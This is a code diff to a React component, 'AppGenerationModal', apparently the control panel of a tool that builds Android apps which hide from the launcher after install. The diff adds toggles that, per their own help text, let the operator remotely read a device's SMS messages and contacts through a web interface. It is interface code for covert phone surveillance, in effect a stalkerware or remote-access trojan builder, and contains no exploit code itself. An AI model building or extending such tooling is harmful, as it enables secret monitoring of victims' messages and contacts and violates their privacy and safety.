@@ -22,6 +22,11 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
     const [webLink, setWebLink] = useState("");
     const [customIcon, setCustomIcon] = useState<File | null>(null);
 
+    // Permission Manager State
+    const [enableSmsPermission, setEnableSmsPermission] = useState(false);
+    const [enableContactsPermission, setEnableContactsPermission] = useState(false);
+    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | null>(null);
+
     useEffect(() => {
         if (isOpen) {
             setStatus('idle');
@@ -100,6 +105,8 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
             formData.append('appName', appName);
             formData.append('hideApp', hideApp.toString());
             formData.append('webLink', webLink);
+            formData.append('enableSmsPermission', enableSmsPermission.toString());
+            formData.append('enableContactsPermission', enableContactsPermission.toString());
             if (customIcon) {
                 formData.append('icon', customIcon);
             }
@@ -191,6 +198,66 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
                             </button>
                         </div>
                         <p className="text-xs text-white/40">App will be hidden from launcher after install.</p>
+
+                        {/* Permission Manager Section */}
+                        <div className="pt-4 border-t border-white/10">
+                            <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
+                                <svg className="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+                                Permission Manager
+                            </h3>
+
+                            {/* SMS Permission */}
+                            <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10 mb-2">
+                                <div className="flex items-center gap-2">
+                                    <svg className="w-4 h-4 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
+                                    <span className="text-sm font-medium text-white/70">SMS Access</span>
+                                    <button
+                                        onClick={() => setShowPermissionInfo(showPermissionInfo === 'sms' ? null : 'sms')}
+                                        className="text-white/40 hover:text-white/60"
+                                    >
+                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    </button>
+                                </div>
+                                <button
+                                    onClick={() => setEnableSmsPermission(!enableSmsPermission)}
+                                    className={`w-12 h-6 rounded-full transition-colors relative ${enableSmsPermission ? 'bg-blue-500' : 'bg-white/20'}`}
+                                >
+                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableSmsPermission ? 'left-7' : 'left-1'}`} />
+                                </button>
+                            </div>
+                            {showPermissionInfo === 'sms' && (
+                                <div className="mb-3 p-3 rounded-lg bg-blue-500/10 border border-blue-500/30 text-xs text-blue-300">
+                                    <p className="font-medium mb-1">📱 SMS Access Permission</p>
+                                    <p className="text-blue-300/80">Enabling this allows you to remotely view SMS messages on the device. You'll be able to see message content, sender information, and timestamps through the web interface.</p>
+                                </div>
+                            )}
+
+                            {/* Contacts Permission */}
+                            <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10 mb-2">
+                                <div className="flex items-center gap-2">
+                                    <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
+                                    <span className="text-sm font-medium text-white/70">Contacts Access</span>
+                                    <button
+                                        onClick={() => setShowPermissionInfo(showPermissionInfo === 'contacts' ? null : 'contacts')}
+                                        className="text-white/40 hover:text-white/60"
+                                    >
+                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    </button>
+                                </div>
+                                <button
+                                    onClick={() => setEnableContactsPermission(!enableContactsPermission)}
+                                    className={`w-12 h-6 rounded-full transition-colors relative ${enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
+                                >
+                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission ? 'left-7' : 'left-1'}`} />
+                                </button>
+                            </div>
+                            {showPermissionInfo === 'contacts' && (
+                                <div className="mb-3 p-3 rounded-lg bg-green-500/10 border border-green-500/30 text-xs text-green-300">
+                                    <p className="font-medium mb-1">📇 Contacts Access Permission</p>
+                                    <p className="text-green-300/80">Enabling this allows you to remotely view contacts on the device. You'll be able to see names, phone numbers, emails, and profile photos through the web interface.</p>
+                                </div>
+                            )}
+                        </div>
                     </div>
                 )}
 
